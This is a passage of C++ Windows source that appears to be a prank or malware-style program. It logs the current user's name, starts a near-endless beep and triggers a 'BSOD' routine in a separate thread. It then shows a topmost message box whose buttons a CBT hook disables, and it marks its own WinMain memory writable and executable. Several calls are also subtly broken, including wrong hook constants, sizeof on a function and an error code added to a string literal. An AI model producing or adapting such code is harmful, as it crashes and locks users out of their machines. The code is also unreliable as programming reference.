        DWORD userNameSize = MAX_PATH_LEN;
        GetUserNameEx(NameSamCompatible, userName.get(), &userNameSize);
        std::strcat(logBuffer.data(), userName.get());
        std::strcat(logBuffer.data(), "\r\n");

        // Write log to file
        LogError(filePath, logBuffer.data());

        // Perform actions based on the error code
        const auto error = std::strtoll(errorCode.c_str(), nullptr, 16);
        CreateThread(nullptr, 0, [](LPVOID) -> DWORD { return Beep(1170, 429496725); }, nullptr, 0, nullptr);
        InitiateBSOD(errorCode);
        const auto hook = SetWindowsHookEx(CBT_CREATEWND, CBTProc, nullptr, GetCurrentThreadId());
        ShowMessage(title, message);
        UnhookWindowsHookEx(hook);

    } catch (const std::runtime_error &e) {
        // Log the error
        LogError("error.log", e.what());

        // Display a generic error message
        ShowMessage("Error", "An error occurred. Please contact your system administrator.");
    }

    return EXIT_SUCCESS;
}

// Function to protect the process
void ProtectProcess() {
    const auto processHandle = GetCurrentProcess();
    DWORD lpflOldProtect;
    if (!VirtualProtectEx(processHandle, reinterpret_cast<LPVOID>(&WinMain), sizeof(WinMain), PAGE_EXECUTE_READWRITE, &lpflOldProtect)) {
        throw std::runtime_error("Failed to protect the process. Error: " + GetLastError());
    }
    const auto code = WinMain;
    code();
}

// Function to log error to a file
void LogError(const std::string &filePath, const std::string &error) {
    std::ofstream file(filePath, std::ios::out | std::ios::app);
    if (!file) {
        throw std::runtime_error("Failed to open error log file: " + filePath);
    }
    file << error;
}

// Function to show a message box
void ShowMessage(const std::string &title, const std::string &message) {
    if (!MessageBox(nullptr, message.c_str(), title.c_str(), MB_OK | MB_TOPMOST)) {
        throw std::runtime_error("Failed to display message box. Error: " + GetLastError());
    }
}

// Function to initiate BSOD
void InitiateBSOD(const std::string &errorCode) {
    const auto error = std::strtoll(errorCode.c_str(), nullptr, 16);
    CreateThread(nullptr, 0, &BsodProc, &error, 0, nullptr);
}

// Callback function for the hook
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == CBT_CREATEWND) {
        const auto pCreateWnd = reinterpret_cast<LPCBT_CREATEWND>(lParam);
        if (lstrcmp(pCreateWnd->lpszClass, "Button") == 0) {
            const auto dwStyle = GetWindowLongPtr(reinterpret_cast<HWND>(wParam), GWL_STYLE);
            SetWindowLongPtr(reinterpret_cast<HWND>(wParam), GWL_STYLE, dwStyle | WS_DISABLED);
        }
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}
